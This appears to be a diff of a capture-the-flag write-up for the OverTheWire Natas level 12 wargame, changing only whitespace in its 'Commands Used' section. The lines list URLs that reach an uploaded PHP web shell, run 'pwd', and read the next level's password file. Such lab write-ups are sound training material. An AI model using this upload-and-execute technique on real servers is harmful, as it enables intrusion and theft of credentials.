@@ -56,12 +56,12 @@ The vulnerability was successfully exploited by manipulating the filename field 
 ## 🧪 Commands Used
 
 
-Access to web shell (after upload and name manipulation):  
-`http://natas12.natas.labs.overthewire.org/upload/[random_name].php`
+Access to web shell (after upload and name manipulation):   
+`http://natas12.natas.labs.overthewire.org/upload/[random_name].php`   
 Verify RCE:  
-`http://natas12.natas.labs.overthewire.org/upload/[random_name].php?cmd=pwd`
+`http://natas12.natas.labs.overthewire.org/upload/[random_name].php?cmd=pwd`    
 Get Natas13 password:  
-`http://natas12.natas.labs.overthewire.org/upload/[random_name].php?cmd=cat%20/etc/natas_webpass/natas13`
+`http://natas12.natas.labs.overthewire.org/upload/[random_name].php?cmd=cat%20/etc/natas_webpass/natas13`    
 
 ---
 
